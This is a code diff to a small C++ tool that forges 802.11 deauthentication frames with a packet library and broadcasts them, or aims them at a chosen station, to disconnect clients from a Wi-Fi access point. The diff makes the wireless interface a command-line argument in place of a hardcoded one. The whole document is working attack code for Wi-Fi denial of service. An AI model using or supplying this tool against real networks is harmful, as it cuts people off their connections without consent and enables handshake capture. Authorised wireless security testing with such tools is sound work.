@@ -7,23 +7,23 @@ using namespace std;
 
 int main(int argc, char** argv) {
 
-        if(argc<2 || argc>3){
-            printf("usage:\n  deauth <options> dst_mac_ap [src_mac_station] \n");
+        if(argc<2 || argc>4){
+            printf("usage:\n  send_deauth <interface> <dst_ap_mac> [<src_station_mac>] \n");
             return 0;
         }
 
         Dot11Deauthentication deauth;
 
-        if(argc==2){
+        if(argc==3){
         deauth.addr1("FF:FF:FF:FF:FF:FF"); // why don't notebook? anyway, check smartphone! done well!!
-        deauth.addr2((Dot11::address_type)argv[1]); // STATION
-        deauth.addr3((Dot11::address_type)argv[1]); // BSSID
+        deauth.addr2((Dot11::address_type)argv[2]); // STATION
+        deauth.addr3((Dot11::address_type)argv[2]); // BSSID
         }
 
-        if(argc==3){
-        deauth.addr1((Dot11::address_type)argv[1]);
-        deauth.addr2((Dot11::address_type)argv[2]);
-        deauth.addr3((Dot11::address_type)argv[1]);
+        if(argc==4){
+        deauth.addr1((Dot11::address_type)argv[2]);
+        deauth.addr2((Dot11::address_type)argv[3]);
+        deauth.addr3((Dot11::address_type)argv[2]);
         }
 
         //deauth.reason_code(3);
@@ -33,6 +33,6 @@ int main(int argc, char** argv) {
         RadioTap radio = RadioTap() / deauth;
 
         PacketSender sender;
-        sender.send(radio, "wlx909f33e950c4");
+        sender.send(radio, (NetworkInterface)argv[1]);
 
 }
